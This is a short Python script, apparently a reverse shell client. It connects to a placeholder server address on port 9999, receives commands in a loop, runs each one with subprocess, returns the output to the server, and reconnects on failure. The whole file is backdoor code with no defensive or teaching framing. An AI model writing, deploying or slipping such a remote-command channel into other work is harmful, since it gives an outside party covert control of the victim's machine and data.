import socket
import time
import subprocess

def server_connect():
    s = socket.socket()
    s.connect(("serverip", 9999))
    return s

def execute_command(command):
    result = subprocess.run(command, capture_output = True, text=True)
    output = result.stdout if result.stdout else result.stderr
    s.send(output.encode())

s = server_connect()

while True:
    try:
        msg = s.recv(1024)
        command = msg.decode("utf-8")
        execute_command(command)
    except socket.error as error_msg:
        print("An Unexpected Connection Error Occured: " + str(error_msg))
        time.sleep(5)
        s = server_connect()

